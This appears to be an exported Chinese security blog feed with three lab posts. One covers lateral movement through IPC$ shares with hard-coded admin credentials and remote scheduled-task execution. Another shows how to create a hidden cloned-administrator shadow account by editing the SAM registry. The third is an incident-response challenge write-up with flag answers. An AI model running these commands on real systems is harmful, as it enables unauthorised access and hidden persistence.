        <content type="html"><![CDATA[<h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h1><p>今天在看微信公众号时，看到一篇IPC总结，想到之前打靶场的时候有用到过这个，只是跟着教程做，也不知道是做什么，可能到这篇特意跟着梳理一下</p><p>原文:</p><p><a href="">域内横向总结系列-IPC</a><a href="https://mp.weixin.qq.com/s/GvYx3gm0r8hXGWtReXk9eA">https://mp.weixin.qq.com/s/GvYx3gm0r8hXGWtReXk9eA</a></p><p><a href="https://cloud.tencent.com/developer/article/1937086">https://cloud.tencent.com/developer/article/1937086</a></p><p><a href="https://blog.csdn.net/qq_34144916/article/details/81184434">https://blog.csdn.net/qq_34144916/article/details/81184434</a></p><h2 id="什么是IPC"><a href="#什么是IPC" class="headerlink" title="什么是IPC"></a><strong>什么是IPC</strong></h2><p>​<strong>IPC$</strong> (Internet Process Connection) 是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p><p>​PC$是NT2000的一项新功能，它有一个特点，即在同一时间内，两个IP之间只允许建立一个连接。</p><p>​NT2000在提供了 IPC$ 共享功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享(C$、D$、E$……)和系统目录共享(Admin$)。</p><p>​所有的这些初衷都是为了方便管理员的管理。但好的初衷并不一定有好的收效，一些别有用心者会利用IPC$，访问共享资源，导出用户列表，并使用一些字典工具，进行密码探测。</p><h2 id="IPC利用条件"><a href="#IPC利用条件" class="headerlink" title="IPC利用条件"></a><strong>IPC利用条件</strong></h2><p>​开启139、445端口</p><p>​管理员开启了默认共享（默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘，和系统目录winnt或Windows(admin$)。通过ipc$可以实现对这些默认共享目录的访问。）</p><p>​获取目标主机的账号密码（hash</p><h2 id="IPC利用方法"><a href="#IPC利用方法" class="headerlink" title="IPC利用方法"></a><strong>IPC利用方法</strong></h2><p>通过建立ipc管道连接可以读取目标主机的目录、文件也可以上传下载文件，还可以通过定时任务命令执行上传到目标主机的木马上线到C2。</p><p>下面来试试一些常用命令，就拿之前的day1靶场来试试</p><p>web服务器：192.168.111.128&#x2F;192.168</p><p>域控：192.168.52.138</p><p>建立IPC连接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.52.138 /u:god\administrator admin@123</span><br></pre></td></tr></table></figure><p>再查看下ipc连接情况</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240825213640340.png" alt="image-20240825213640340"></p><p>删除IPC连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.52.138 /de /y</span><br><span class="line">net use</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240825214203706.png" alt="image-20240825214203706"></p><p>查看目标共享资源</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view \\192.168.52.138</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240825214247426.png" alt="image-20240825214247426"></p><p>列出目标下C盘资源</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view \\192.168.52.138\c$</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240825214444620.png" alt="image-20240825214444620"></p><p>上传文件到目标机器C盘,如果有过了，会让你选择是否覆盖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy .\1.txt \\192.168.52.138\c$\</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240825214730414.png" alt="image-20240825214730414"></p><p><img src="/../image/image-20240825214637885.png" alt="image-20240825214637885"></p><p>查看刚上传上去的文件内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type \\192.168.52.138\c$\1.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240825215945217.png" alt="image-20240825215945217"></p><p>下载目标机器文件到本机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy \\192.168.52.138\c$\a.txt . &gt; 2.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240825220346939.png" alt="image-20240825220346939"></p><p>列出目标主机的进程，可以看到目标机器有没有杀软</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /S 192.168.52.138 /U Administrator /P admin@123</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240825220538660.png" alt="image-20240825220538660"></p><p>创建计划任务,<strong>schtasks(计划任务)</strong></p><p>Windows Vista、Windows Server 2008及之后版本的操作系统已经弃用at命令，而转为用schtasks命令。schtasks命令比 at 命令更灵活。在使用schtasks命令时，会在系统中留下日志文件：C:\Windows\Tasks\SchedLgU.txt.这里因为是win2003，所以还是用st测试</p><p>St：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /create /tn test /U got\administrator /P admin@123 /tr &quot;cmd /c ipconfig &gt; c:\ipconfig.txt&quot; /sc MINUTE /mo 1 /s 192.168.52.138 /RU system</span><br></pre></td></tr></table></figure><ul><li><code>/tn test</code>: 指定要创建的计划任务的名称为 “test”。</li><li><code>/tr &quot;cmd /c ipconfig &gt; c:\ipconfig.txt&quot;</code>: 指定计划任务要运行的命令，这里是运行 <code>ipconfig</code> 命令并将结果输出到 <code>c:\ipconfig.txt</code> 文件。</li><li><code>/sc MINUTE</code>: 指定计划任务的触发器类型为分钟级别。</li><li><code>/mo 1</code>: 指定每隔 1 分钟运行一次该任务。</li><li><code>/RU system</code>: 指定要用于运行任务的用户账户为系统账户。</li></ul><p><img src="/../image/image-20240825221434349.png" alt="image-20240825221434349"></p><p><img src="/../image/image-20240825221449353.png" alt="image-20240825221449353"></p><p><img src="/../image/image-20240825221514839.png" alt="image-20240825221514839"></p><p>执行计划任务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /run /tn test /s 192.168.52.138 /U god\administrator /P admin@123</span><br></pre></td></tr></table></figure><p>删除计划任务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /F /delete /tn test /s 192.168.52.138 /U god\administrator /P admin@123</span><br></pre></td></tr></table></figure><p>at命令</p><p>使用at前需要建立IPC连接</p><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">at \\192.168.52.138:40AM cmd /c &quot;ipconfig &gt; c:\i.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240825224505490.png" alt="image-20240825224505490"></p><p><img src="/../image/image-20240825224540187.png" alt="image-20240825224540187"></p><p>清除记录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">at \\192.168.52.138 作业ID /delete</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240825224726918.png" alt="image-20240825224726918"></p><p><img src="/../image/image-20240825224752266.png" alt="image-20240825224752266"></p><h2 id="IPC-连接失败的原因及常见错误号"><a href="#IPC-连接失败的原因及常见错误号" class="headerlink" title="IPC$连接失败的原因及常见错误号"></a><em><strong>IPC$连接失败的原因及常见错误号</strong></em></h2><h4 id="连接失败原因"><a href="#连接失败原因" class="headerlink" title="连接失败原因"></a><em><strong>连接失败原因</strong></em></h4><ul><li><em>用户名或密码错误</em></li><li><em>目标主机没有开启IPC$共享</em></li><li><em>不能成功连接目标主机的139、445端口</em></li><li><em>命令输入错误</em></li></ul><h4 id="常见错误号"><a href="#常见错误号" class="headerlink" title="常见错误号"></a><em><strong>常见错误号</strong></em></h4><ul><li><em>错误号5：拒绝访问</em></li><li><em>错误号51：Windows无法找到网络路径，及网络中存在问题</em></li><li><em>错误号53：找不到网络路径，包括IP地址错误、目标未开机、目标的lanmanserver服务未启动，目标防火墙过滤了端口</em></li><li><em>错误号67：找不到网络名，包括 lanmanworkstation 服务未启动，IPC$已被删除</em></li><li><em>错误号1219：提供的凭据与已存在的凭据集冲突。例如已经和目标建立了IPC$连接，需要在删除后重新连接</em></li><li><em>错误号1326：未知的用户名或错误的密码</em></li><li><em>错误号1792：试图登录，但是网络登录服务没有启动，包括目标NetLogon服务未启动(连接域控制器时会出现此情况)</em></li><li><em>错误号2242：此用户的密码已经过期。</em></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IPC </tag>
            
            <tag> 域内横向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win隐藏用户</title>
      <link href="/2024/08/23/win%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/"/>
      <url>/2024/08/23/win%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="win隐藏用户"><a href="#win隐藏用户" class="headerlink" title="win隐藏用户"></a>win隐藏用户</h1><p>教程：<a href="https://www.cnblogs.com/bonelee/p/15938755.htm">https://www.cnblogs.com/bonelee/p/15938755.htm</a></p><h2 id="一、创建隐藏用户及分配管理员权限"><a href="#一、创建隐藏用户及分配管理员权限" class="headerlink" title="一、创建隐藏用户及分配管理员权限"></a>一、创建隐藏用户及分配管理员权限</h2><p>要管理员身份运行的cmd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$ 123456 /add</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240823155128122.png" alt="image-20240823155128122"></p><p>注：若不是管理有权限，则创建账号时会提示“发生系统错误 5”。</p><p><img src="/../image/image-20240823155047702.png" alt="image-20240823155047702"></p><p>这时使用net user是查看不到隐藏账号，使用net user admin$这发现这个隐藏账号是存在的：</p><p><img src="/../image/image-20240823155159543.png" alt="image-20240823155159543"></p><p>把隐藏账号设为管理员组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators admin$ /add</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240823155337618.png" alt="image-20240823155337618"></p><p>此时隐藏账号admin虽然在CMD里面用net user查看不到，但查看用户和组的时候还是可以发现，所以还需要修改注册表来进行隐藏账号。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240823155447457.png" alt="image-20240823155447457"></p><h2 id="二、修改注册表进行账号隐藏和克隆管理员权限"><a href="#二、修改注册表进行账号隐藏和克隆管理员权限" class="headerlink" title="二、修改注册表进行账号隐藏和克隆管理员权限"></a>二、修改注册表进行账号隐藏和克隆管理员权限</h2><p>1）添加查看注册表中账号权限</p><p>在regedt32.exe中来到“HKEY_LOCAL_MACHINE\SAM\SAM”处，点击“安全”菜单→“权限”，在弹出的“SAM的权限”编辑窗口中选中“administrators”账户，在下方的权限设置处勾选“完全控制”，完成后点击“确定”即可。</p><p><img src="/../image/image-20240823155635980.png" alt="image-20240823155635980"></p><p>重进注册表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup SYSTEM admin$ /add</span><br></pre></td></tr></table></figure><p>2)导出并编辑注册表项</p><p>进入注册表项HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names可以看到系统所有账号也包括隐藏账号admin$。点击账号名可在右边看到账号类型，admin$类型是3ec,而administraor的类型是1f4</p><p><img src="/../image/image-20240823155908837.png" alt="image-20240823155908837"></p><p><img src="/../image/image-20240823155919325.png" alt="image-20240823155919325"></p><p>将admin$导出为admin.reg；把000003EC导出为admin3ec.reg；把000001F4导出为admin1f4.reg。</p><p>编辑admin1f4.reg,将它里面属于’F’的内容分复制下来，替换admin3eb.reg里面F的值。</p><p><img src="/../image/image-20240823160317512.png" alt="image-20240823160317512"></p><p>做完这一步后，去命令提示符里面执行，net user admin$ &#x2F;del,删除这个账号</p><p><img src="/../image/image-20240823160353088.png" alt="image-20240823160353088"></p><p>然后将admin.reg和admin3eb.reg双击导入注册表，然后我们再回到注册表把之前改的权限全部取消掉，至此隐藏管理员影子账号就完成了。</p><p><img src="/../image/image-20240823160449973.png" alt="image-20240823160449973"></p><p>去计算机管理成员组里面也是找不到这个账号的。当然重启还是会出现。有些服务器长期不重启，所以能隐藏很久。</p><p>3）远程登录隐藏账号</p><p>使用隐藏账号admin$远程登录，登录后发现查询自己却还是administrator，但登录的确实admin$，这就是克隆了administrator账号并进行隐藏的效果。</p><p>whoami #我是谁</p><p>query user #当前登录的账号</p><p><img src="/../image/image-20240823160759521.png" alt="image-20240823160759521"></p><p><img src="/../image/image-20240823160808908.png" alt="image-20240823160808908"></p><p><img src="/../image/image-20240823163409162.png" alt="image-20240823163409162"></p><p>不懂为什么会这样，我试试不做删除隐藏那一步，创建了个hack$，然后登陆一下下是可以，就是原来的账号被顶掉了</p><p><img src="/../image/image-20240823163909607.png" alt="image-20240823163909607"></p><p><img src="/../image/image-20240823163917469.png" alt="image-20240823163917469"></p><p><img src="/../image/image-20240823163902307.png" alt="image-20240823163902307"></p><p>又改了一下还是这个问题。。。</p><p><img src="/../image/image-20240823164235437.png" alt="image-20240823164235437"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 隐藏用户 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows10日志分析(一)</title>
      <link href="/2024/08/22/Windows10%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-%E4%B8%80/"/>
      <url>/2024/08/22/Windows10%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原文：https://mp.weixin.qq.com/s/eJpsOeaEczcPE-uipP7vCQ</span><br></pre></td></tr></table></figure><p><strong>题目:</strong>   </p><ol><li><p><strong>审计桌面的logs日志，定位所有扫描IP，并提交扫描次数</strong>  </p></li><li><p><strong>审计相关日志，提交rdp被爆破失败次数</strong>  </p></li><li><p><strong>审计相关日志，提交成功登录rdp的远程IP地址，多个以&amp;连接,以从小到大顺序排序提交</strong>  </p></li><li><p><strong>提交黑客创建的隐藏账号</strong>  </p></li><li><p><strong>提交黑客创建的影子账号</strong> </p></li><li><p><strong>黑客植入了一个远程shell，审计相关进程和自启动项提交该程序名字</strong>  </p></li><li><p><strong>提交远程shell程序的连接IP+端口，以IP:port方式提交  8</strong></p></li><li><p><strong>黑客使用了计划任务来定时执行某shell程序，提交此程序名字</strong></p></li></ol><h1 id="审计桌面的logs日志，定位所有扫描IP，并提交扫描次数-【6385】"><a href="#审计桌面的logs日志，定位所有扫描IP，并提交扫描次数-【6385】" class="headerlink" title="审计桌面的logs日志，定位所有扫描IP，并提交扫描次数 【6385】"></a><strong>审计桌面的logs日志，定位所有扫描IP，并提交扫描次数</strong> 【6385】</h1><p><img src="/../image/image-20240822184728846.png" alt="image-20240822184728846"></p><p>进入桌面日志，我们可以看到这两个文件，一个access.log和error.log</p><ul><li><strong>access_log：指的是访问日志，我们通过访问日志可以获取用户的 IP、请求处理的时间、浏览器信息等</strong></li><li><strong>error_log：错误日志记录了访问出错的信息，可以用于定位错误的原因</strong></li></ul><p>访问不一定都成功，所以要结合上error_log,error是在服务出问题，比如出现500&#x2F;502&#x2F;504之类的故障才写入</p><p>简单看了下网站，是一个购物打的cms</p><p><img src="/../image/image-20240822190346989.png" alt="image-20240822190346989"></p><p> 观察日志特征，127.0.0.1为本地IP，搭建后进行测试，192.168.150.1后面的url为业务站点IP(此处可以自行开启phpstudy进行测试),后面发现大量ip地址为192.168.150.67的地址访问网站，这里想把文件复制出来，结果装不了vmtools，简单搭建个文件上传的网站试试</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后台</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$targetDir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$targetFile</span> = <span class="variable">$targetDir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$imageFileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$targetFile</span>, PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查文件是否已存在</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$targetFile</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件已存在。&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查 $uploadOk 是否为 0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$uploadOk</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件未上传。&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$targetFile</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件 &quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]) . <span class="string">&quot; 上传成功。&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件上传失败。&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后用phpstom简单起个服务器即可，然后在虚拟机访问下页面进行文件上传，然后移动到cmder目录下分析，发现192.168.150.67有这种访问敏感文件的行为</p><p><img src="/../image/image-20240822194757163.png" alt="image-20240822194757163"></p><p>字典扫描，漏扫的特征，404等，确定这就是恶意扫描的IP</p><p><img src="/../image/image-20240822194851743.png" alt="image-20240822194851743"></p><p><img src="/../image/image-20240822194941196.png" alt="image-20240822194941196"></p><p>还发现192.168.150.33有nmap扫描行为</p><p><img src="/../image/image-20240822195102623.png" alt="image-20240822195102623"></p><p>判断这是傀儡机对web端口进行的web探测，目前已知这两个IP为扫描特征，再往下看没什么特征了，而且这是在模拟，数据少，实战中这样看眼花也找不出来。我们可以先看下全部有多少ip访问这个网站</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;&#123;print $1&#125;&#x27; access.log | sort | uniq -c | sort</span><br></pre></td></tr></table></figure><p>这条指令是一个典型的用于对文本进行统计和排序的命令链。让我们逐步解析这条命令：</p><ol><li><code>awk &#39;&#123;print $1&#125;&#39; access.log</code>: 这部分使用 <code>awk</code> 命令，它是一个用于处理文本和数据流的强大工具。<code>&#39;&#123;print $1&#125;&#39;</code> 意味着对文件 <code>access.log</code> 中的每一行进行处理，只打印出每行的第一个字段。</li><li><code>| sort</code>: 这里使用了管道符 <code>|</code>，它将 <code>awk</code> 命令的输出传递给 <code>sort</code> 命令。<code>sort</code> 命令用于对输入进行排序，默认是按照字母顺序升序排列。</li><li><code>| uniq -c</code>: 这里再次使用了管道符，将 <code>sort</code> 命令的输出传递给 <code>uniq -c</code> 命令。<code>uniq -c</code> 会对相邻的重复行进行去重，并且统计重复行出现的次数。</li><li><code>| sort</code>: 最后一个 <code>sort</code> 命令对 <code>uniq -c</code> 的输出进行排序，这样统计结果将按照重复次数进行排序，从而展示出重复次数最多的行在前面。</li></ol><p>综合起来，这条命令的作用是从 <code>access.log</code> 中提取每行的第一个字段，然后统计每个字段出现的次数，并按照次数从高到低进行排序，最终输出结果。</p><p><img src="/../image/image-20240822200055224.png" alt="image-20240822200055224"></p><p>以IP的为基准进行排序，看到192.168.150.67扫描最多，我们将它和192.168.150.33进行相加得出共扫描次数为<strong>6385</strong>次</p><h1 id="审计相关日志，提交rdp被爆破失败次数-【2594】"><a href="#审计相关日志，提交rdp被爆破失败次数-【2594】" class="headerlink" title="审计相关日志，提交rdp被爆破失败次数 【2594】"></a><strong>审计相关日志，提交rdp被爆破失败次数</strong> 【2594】</h1><p>通过事件日志进行查看，快捷键WIN+R输入 ‘eventvwr.msc’ 进入事件查看，点击安全，可以看到账户类操作日志，我们同样保存下来，日志机上有log parser，直接在日志机上分析即可，先导出Securtiy.evtx,但后续测试好像不行，还是传到本机上吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录失败的所有事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM Security.evtx where EventID=4625&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/1724378311142.png" alt="1724378311142"></p><p>这个扫出来好像有点不对，直接在里面筛选的话，除去自己登陆的那一条，和答案是一样的2594</p><p><img src="/../image/image-20240823095937412.png" alt="image-20240823095937412"></p><p>换了一下参数4625，前面那句好像没有进行统计</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT COUNT(*) AS TotalFailedLogins FROM ./uploads/Security.evtx WHER</span><br><span class="line">E EventID=4625&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240823100854393.png" alt="image-20240823100854393"></p><h1 id="审计相关日志，提交成功登录rdp的远程IP地址，多个以-amp-连接-以从小到大顺序排序提交-1-128-178"><a href="#审计相关日志，提交成功登录rdp的远程IP地址，多个以-amp-连接-以从小到大顺序排序提交-1-128-178" class="headerlink" title="审计相关日志，提交成功登录rdp的远程IP地址，多个以&amp;连接,以从小到大顺序排序提交[1,128,178]"></a>审计相关日志，提交成功登录rdp的远程IP地址，多个以&amp;连接,以从小到大顺序排序提交[1,128,178]</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT DISTINCT EXTRACT_TOKEN(Strings, 18, &#x27;|&#x27;) AS RemoteIPAdd</span><br><span class="line">ress FROM Security.evtx WHERE EventID=4624&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240823103527112.png" alt="image-20240823103527112"></p><p>我这里以为除了回环地址应该还有个33的主机，这里4624应该是所有账户登陆成功的消息，而后面说的4648是用明确的凭证登陆，这个才是查看远程登陆的正则，我们应该按照这个找，我去自带的筛选器里手动查了一下</p><p><img src="/../image/image-20240823104140278.png" alt="image-20240823104140278"></p><p>除了回环地址确实是1、128、178</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT DISTINCT EXTRACT_TOKEN(Strings, 12, &#x27;|&#x27;) AS RemoteIPAdd</span><br><span class="line">ress FROM Security.evtx WHERE EventID=4648&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240823104613212.png" alt="image-20240823104613212"></p><h3 id="提交黑客创建的隐藏账号-hacker"><a href="#提交黑客创建的隐藏账号-hacker" class="headerlink" title="提交黑客创建的隐藏账号{hacker$}"></a>提交黑客创建的隐藏账号{hacker$}</h3><p>查看注册表，Win+R regedit，也可以用cmd的reg query直接查，但是要以管理员身份模式启动，还有lusrmgr.msc方法很多。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240823110411424.png" alt="image-20240823110411424"></p><p><img src="/../image/image-20240823110850382.png" alt="image-20240823110850382"></p><p><img src="/../image/image-20240823110952780.png" alt="image-20240823110952780"></p><p>这里hackers$是影子账号，作者的原意应该是没有的，他也不知道为什么删不掉，不过下一题就是问这个的了</p><h1 id="提交黑客创建的影子账号-hackers"><a href="#提交黑客创建的影子账号-hackers" class="headerlink" title="提交黑客创建的影子账号{hackers$}"></a>提交黑客创建的影子账号{hackers$}</h1><p>  影子账号真实环境中是无法在用户组&#x2F;netuser&#x2F;用户面板中看到，但是可以在注册表中看到并删除</p><p><img src="/../image/image-20240823112014638.png" alt="image-20240823112014638"></p><p>  对这两个目录进行删除，再去刚刚的用户&#x2F;组 查看将没有了</p><p><img src="/../image/image-20240823140843802.png" alt="image-20240823140843802"></p><p>  正常来讲，影子用户确实除注册表，其它地方看不到的，这里可能我操作有问题</p><p>  当然了，在桌面Dsafe目录下有D盾工具，使用<strong>管理员权限运行</strong>后，可以快速查询到本系统中存在的影子用户和克隆账户</p><p><img src="/../image/image-20240823141059209.png" alt="image-20240823141059209"></p><h1 id="提交远程shell程序的连接IP-端口，以IP-port方式提交-185-117-118-21-4444"><a href="#提交远程shell程序的连接IP-端口，以IP-port方式提交-185-117-118-21-4444" class="headerlink" title="提交远程shell程序的连接IP+端口，以IP:port方式提交{185.117.118.21:4444}"></a>提交远程shell程序的连接IP+端口，以IP:port方式提交{185.117.118.21:4444}</h1><p>使用netstat -nao查看到相应的端口状态，在后面看到可疑连接</p><p><img src="/../image/image-20240823141339748.png" alt="image-20240823141339748"></p><p>有对外连接的ip，下面两个是80端口，应该是正常的http页面，而4444端口则有可能是shell程序的连接端口</p><p>  可看到对外连接不少的互联网IP，排查思路如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 根据外联IP地址进行排查，在情报平台进行查询</span><br><span class="line">2. 根据端口进行排查，通常大端口或有特殊意义端口要确认</span><br><span class="line">3. 依次根据PID进行排查</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240823150147828.png" alt="image-20240823150147828"></p><h1 id="黑客植入了一个远程shell，审计相关进程和自启动项提交该程序名字flag-xiaowei-exe"><a href="#黑客植入了一个远程shell，审计相关进程和自启动项提交该程序名字flag-xiaowei-exe" class="headerlink" title="黑客植入了一个远程shell，审计相关进程和自启动项提交该程序名字flag{xiaowei.exe}"></a><strong>黑客植入了一个远程shell，审计相关进程和自启动项提交该程序名字</strong>flag{xiaowei.exe}</h1><p>开机就外联了，这个时候我们应该联想到自启动，一般排查以下</p><ol><li><p>C:\Users\winlog\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup  快捷命令：WIN+R shell:startup 将预自启动程序放入目录，会自启</p></li><li><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run  注册表自启动：快捷键：WIN+R regedit 将绝对路径下程序进行字符串值保存会开机自启</p></li><li><p>搜索计划任务，进入任务计划程序，查看相关启动程序</p></li></ol><p>查看下注册表的时候你其实可以看到上次开目录还记录着。。。。</p><p><img src="/../image/image-20240823150718140.png" alt="image-20240823150718140"></p><p>当然了，在排查这些之前，我们需要知道在跑的程序是哪个，已知PID为<strong>2756</strong></p><p><img src="/../image/image-20240823150825217.png" alt="image-20240823150825217"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist | findstr &quot;2756&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240823150906484.png" alt="image-20240823150906484"></p><p>使用以上命令查看到启动的文件为xiaowei.exe，但是不知道绝对路径如何处置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process get name,executablepath,processid | findstr 2756</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240823151247678.png" alt="image-20240823151247678"></p><p> 当然了，我们也可以使用 <strong>netstat -naob</strong>查看进程的启动程序和端口</p><p><img src="/../image/image-20240823151329259.png" alt="image-20240823151329259"></p><p> 将xiaowei.exe文件拖出来，拿到ida或者微步沙箱去看一下，明显的木马特征和Cobalt特征</p><p><img src="/../image/image-20240823152503518.png" alt="image-20240823152503518"></p><p><img src="/../image/image-20240823152617488.png" alt="image-20240823152617488"></p><h1 